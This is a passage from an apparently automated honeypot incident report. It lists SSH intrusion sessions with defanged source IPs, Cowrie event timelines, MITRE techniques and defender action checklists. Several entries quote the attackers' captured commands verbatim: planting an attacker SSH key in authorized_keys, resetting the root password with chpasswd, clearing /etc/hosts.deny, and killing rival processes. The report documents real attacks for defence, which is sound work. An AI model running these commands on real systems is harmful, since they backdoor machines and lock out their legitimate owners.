| `2026-06-02 23:30:09` | `cowrie.client.kex` |
| `2026-06-02 23:30:09` | `cowrie.login.success` |
| `2026-06-02 23:30:09` | `cowrie.session.params` |
| `2026-06-02 23:30:09` | `cowrie.command.input` |
| `2026-06-02 23:30:09` | `cowrie.command.failed` |
| `2026-06-02 23:30:09` | `cowrie.log.closed` |
| `2026-06-02 23:30:09` | `cowrie.session.params` |
| `2026-06-02 23:30:09` | `cowrie.command.input` |
| `2026-06-02 23:30:09` | `cowrie.session.file_download` |
| `2026-06-02 23:30:09` | `cowrie.log.closed` |
| `2026-06-02 23:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8c5a49022c

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]76` |
| **First Seen** | 2026-06-02 23:30 |
| **Last Seen** | 2026-06-02 23:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:30:11` | `cowrie.session.connect` |
| `2026-06-02 23:30:11` | `cowrie.client.version` |
| `2026-06-02 23:30:11` | `cowrie.client.kex` |
| `2026-06-02 23:30:11` | `cowrie.login.success` |
| `2026-06-02 23:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078b583f1fd2

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:32 |
| **Last Seen** | 2026-06-02 23:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:32:23` | `cowrie.session.connect` |
| `2026-06-02 23:32:23` | `cowrie.client.version` |
| `2026-06-02 23:32:23` | `cowrie.client.kex` |
| `2026-06-02 23:32:23` | `cowrie.login.success` |
| `2026-06-02 23:32:23` | `cowrie.session.params` |
| `2026-06-02 23:32:23` | `cowrie.command.input` |
| `2026-06-02 23:32:23` | `cowrie.command.failed` |
| `2026-06-02 23:32:23` | `cowrie.log.closed` |
| `2026-06-02 23:32:23` | `cowrie.session.params` |
| `2026-06-02 23:32:23` | `cowrie.command.input` |
| `2026-06-02 23:32:23` | `cowrie.session.file_download` |
| `2026-06-02 23:32:23` | `cowrie.log.closed` |
| `2026-06-02 23:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de87c9dde70

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:32 |
| **Last Seen** | 2026-06-02 23:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:32:25` | `cowrie.session.connect` |
| `2026-06-02 23:32:25` | `cowrie.client.version` |
| `2026-06-02 23:32:25` | `cowrie.client.kex` |
| `2026-06-02 23:32:25` | `cowrie.login.success` |
| `2026-06-02 23:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-258b5e2a1d4e

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:34 |
| **Last Seen** | 2026-06-02 23:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:34:31` | `cowrie.session.connect` |
| `2026-06-02 23:34:31` | `cowrie.client.version` |
| `2026-06-02 23:34:31` | `cowrie.client.kex` |
| `2026-06-02 23:34:31` | `cowrie.login.success` |
| `2026-06-02 23:34:32` | `cowrie.session.params` |
| `2026-06-02 23:34:32` | `cowrie.command.input` |
| `2026-06-02 23:34:32` | `cowrie.command.failed` |
| `2026-06-02 23:34:32` | `cowrie.log.closed` |
| `2026-06-02 23:34:32` | `cowrie.session.params` |
| `2026-06-02 23:34:32` | `cowrie.command.input` |
| `2026-06-02 23:34:32` | `cowrie.session.file_download` |
| `2026-06-02 23:34:32` | `cowrie.log.closed` |
| `2026-06-02 23:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144794920ba0

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:34 |
| **Last Seen** | 2026-06-02 23:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:34:33` | `cowrie.session.connect` |
| `2026-06-02 23:34:33` | `cowrie.client.version` |
| `2026-06-02 23:34:33` | `cowrie.client.kex` |
| `2026-06-02 23:34:33` | `cowrie.login.success` |
| `2026-06-02 23:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f63a12983d0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]25` |
| **First Seen** | 2026-06-02 23:35 |
| **Last Seen** | 2026-06-02 23:36 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:aoF4HOYEuPW2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:35:39` | `cowrie.session.connect` |
| `2026-06-02 23:35:39` | `cowrie.client.version` |
| `2026-06-02 23:35:39` | `cowrie.client.kex` |
| `2026-06-02 23:35:40` | `cowrie.login.success` |
| `2026-06-02 23:35:40` | `cowrie.session.params` |
| `2026-06-02 23:35:40` | `cowrie.command.input` |
| `2026-06-02 23:35:40` | `cowrie.command.failed` |
| `2026-06-02 23:35:40` | `cowrie.log.closed` |
| `2026-06-02 23:35:41` | `cowrie.session.params` |
| `2026-06-02 23:35:41` | `cowrie.command.input` |
| `2026-06-02 23:35:41` | `cowrie.session.file_download` |
| `2026-06-02 23:35:41` | `cowrie.log.closed` |
| `2026-06-02 23:36:09` | `cowrie.session.params` |
| `2026-06-02 23:36:09` | `cowrie.command.input` |
| `2026-06-02 23:36:09` | `cowrie.log.closed` |
| `2026-06-02 23:36:09` | `cowrie.session.params` |
| `2026-06-02 23:36:09` | `cowrie.command.input` |
| `2026-06-02 23:36:10` | `cowrie.log.closed` |
| `2026-06-02 23:36:10` | `cowrie.session.params` |
| `2026-06-02 23:36:10` | `cowrie.command.input` |
| `2026-06-02 23:36:10` | `cowrie.session.file_download` |
| `2026-06-02 23:36:10` | `cowrie.log.closed` |
| `2026-06-02 23:36:10` | `cowrie.session.params` |
| `2026-06-02 23:36:10` | `cowrie.command.input` |
| `2026-06-02 23:36:11` | `cowrie.log.closed` |
| `2026-06-02 23:36:11` | `cowrie.session.params` |
| `2026-06-02 23:36:11` | `cowrie.command.input` |
| `2026-06-02 23:36:11` | `cowrie.log.closed` |
| `2026-06-02 23:36:11` | `cowrie.session.params` |
| `2026-06-02 23:36:11` | `cowrie.command.input` |
| `2026-06-02 23:36:11` | `cowrie.command.input` |
| `2026-06-02 23:36:12` | `cowrie.log.closed` |
| `2026-06-02 23:36:12` | `cowrie.session.params` |
| `2026-06-02 23:36:12` | `cowrie.command.input` |
| `2026-06-02 23:36:12` | `cowrie.log.closed` |
| `2026-06-02 23:36:12` | `cowrie.session.params` |
| `2026-06-02 23:36:12` | `cowrie.command.input` |
| `2026-06-02 23:36:12` | `cowrie.log.closed` |
| `2026-06-02 23:36:13` | `cowrie.session.params` |
| `2026-06-02 23:36:13` | `cowrie.command.input` |
| `2026-06-02 23:36:13` | `cowrie.log.closed` |
| `2026-06-02 23:36:13` | `cowrie.session.params` |
| `2026-06-02 23:36:13` | `cowrie.command.input` |
| `2026-06-02 23:36:13` | `cowrie.log.closed` |
| `2026-06-02 23:36:13` | `cowrie.session.params` |
| `2026-06-02 23:36:13` | `cowrie.command.input` |
| `2026-06-02 23:36:14` | `cowrie.log.closed` |
| `2026-06-02 23:36:14` | `cowrie.session.params` |
| `2026-06-02 23:36:14` | `cowrie.command.input` |
| `2026-06-02 23:36:14` | `cowrie.log.closed` |
| `2026-06-02 23:36:14` | `cowrie.session.params` |
| `2026-06-02 23:36:14` | `cowrie.command.input` |
| `2026-06-02 23:36:15` | `cowrie.log.closed` |
| `2026-06-02 23:36:15` | `cowrie.session.params` |
| `2026-06-02 23:36:15` | `cowrie.command.input` |
| `2026-06-02 23:36:15` | `cowrie.log.closed` |
| `2026-06-02 23:36:15` | `cowrie.session.params` |
| `2026-06-02 23:36:15` | `cowrie.command.input` |
| `2026-06-02 23:36:15` | `cowrie.log.closed` |
| `2026-06-02 23:36:16` | `cowrie.session.params` |
| `2026-06-02 23:36:16` | `cowrie.command.input` |
| `2026-06-02 23:36:16` | `cowrie.log.closed` |
| `2026-06-02 23:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]25` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c928abf02d

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:35 |
| **Last Seen** | 2026-06-02 23:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:35:46` | `cowrie.session.connect` |
| `2026-06-02 23:35:46` | `cowrie.client.version` |
| `2026-06-02 23:35:46` | `cowrie.client.kex` |
| `2026-06-02 23:35:46` | `cowrie.login.success` |
| `2026-06-02 23:35:47` | `cowrie.session.params` |
| `2026-06-02 23:35:47` | `cowrie.command.input` |
| `2026-06-02 23:35:47` | `cowrie.command.failed` |
| `2026-06-02 23:35:47` | `cowrie.log.closed` |
| `2026-06-02 23:35:47` | `cowrie.session.params` |
| `2026-06-02 23:35:47` | `cowrie.command.input` |
| `2026-06-02 23:35:47` | `cowrie.session.file_download` |
| `2026-06-02 23:35:47` | `cowrie.log.closed` |
| `2026-06-02 23:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd88d16b97c2

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:35 |
| **Last Seen** | 2026-06-02 23:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:35:49` | `cowrie.session.connect` |
| `2026-06-02 23:35:49` | `cowrie.client.version` |
| `2026-06-02 23:35:49` | `cowrie.client.kex` |
| `2026-06-02 23:35:50` | `cowrie.login.success` |
| `2026-06-02 23:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a758bc7ff4e9

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:38 |
| **Last Seen** | 2026-06-02 23:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:38:25` | `cowrie.session.connect` |
| `2026-06-02 23:38:25` | `cowrie.client.version` |
| `2026-06-02 23:38:25` | `cowrie.client.kex` |
| `2026-06-02 23:38:26` | `cowrie.login.success` |
| `2026-06-02 23:38:26` | `cowrie.session.params` |
| `2026-06-02 23:38:26` | `cowrie.command.input` |
| `2026-06-02 23:38:26` | `cowrie.command.failed` |
| `2026-06-02 23:38:26` | `cowrie.log.closed` |
| `2026-06-02 23:38:27` | `cowrie.session.params` |
| `2026-06-02 23:38:27` | `cowrie.command.input` |
| `2026-06-02 23:38:27` | `cowrie.session.file_download` |
| `2026-06-02 23:38:27` | `cowrie.log.closed` |
| `2026-06-02 23:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7558420d601e

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:38 |
| **Last Seen** | 2026-06-02 23:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:38:29` | `cowrie.session.connect` |
| `2026-06-02 23:38:29` | `cowrie.client.version` |
| `2026-06-02 23:38:29` | `cowrie.client.kex` |
| `2026-06-02 23:38:29` | `cowrie.login.success` |
| `2026-06-02 23:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2e0ae733caa

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:38 |
| **Last Seen** | 2026-06-02 23:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:38:58` | `cowrie.session.connect` |
| `2026-06-02 23:38:58` | `cowrie.client.version` |
| `2026-06-02 23:38:58` | `cowrie.client.kex` |
| `2026-06-02 23:38:58` | `cowrie.login.success` |
| `2026-06-02 23:38:58` | `cowrie.session.params` |
| `2026-06-02 23:38:58` | `cowrie.command.input` |
| `2026-06-02 23:38:58` | `cowrie.command.failed` |
| `2026-06-02 23:38:58` | `cowrie.log.closed` |
| `2026-06-02 23:38:58` | `cowrie.session.params` |
| `2026-06-02 23:38:58` | `cowrie.command.input` |
| `2026-06-02 23:38:58` | `cowrie.session.file_download` |
| `2026-06-02 23:38:58` | `cowrie.log.closed` |
| `2026-06-02 23:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5ed1225894

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]93` |
| **First Seen** | 2026-06-02 23:39 |
| **Last Seen** | 2026-06-02 23:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:39:00` | `cowrie.session.connect` |
| `2026-06-02 23:39:00` | `cowrie.client.version` |
| `2026-06-02 23:39:00` | `cowrie.client.kex` |
| `2026-06-02 23:39:00` | `cowrie.login.success` |
| `2026-06-02 23:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]93` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1b93e61aeb

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:40 |
| **Last Seen** | 2026-06-02 23:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:40:51` | `cowrie.session.connect` |
| `2026-06-02 23:40:51` | `cowrie.client.version` |
| `2026-06-02 23:40:51` | `cowrie.client.kex` |
| `2026-06-02 23:40:52` | `cowrie.login.success` |
| `2026-06-02 23:40:52` | `cowrie.session.params` |
| `2026-06-02 23:40:52` | `cowrie.command.input` |
| `2026-06-02 23:40:52` | `cowrie.command.failed` |
| `2026-06-02 23:40:52` | `cowrie.log.closed` |
| `2026-06-02 23:40:53` | `cowrie.session.params` |
| `2026-06-02 23:40:53` | `cowrie.command.input` |
| `2026-06-02 23:40:53` | `cowrie.session.file_download` |
| `2026-06-02 23:40:53` | `cowrie.log.closed` |
| `2026-06-02 23:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc359d76902f

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:40 |
| **Last Seen** | 2026-06-02 23:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:40:55` | `cowrie.session.connect` |
| `2026-06-02 23:40:55` | `cowrie.client.version` |
| `2026-06-02 23:40:55` | `cowrie.client.kex` |
| `2026-06-02 23:40:55` | `cowrie.login.success` |
| `2026-06-02 23:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b4e180d6fb

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-06-02 23:43 |
| **Last Seen** | 2026-06-02 23:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
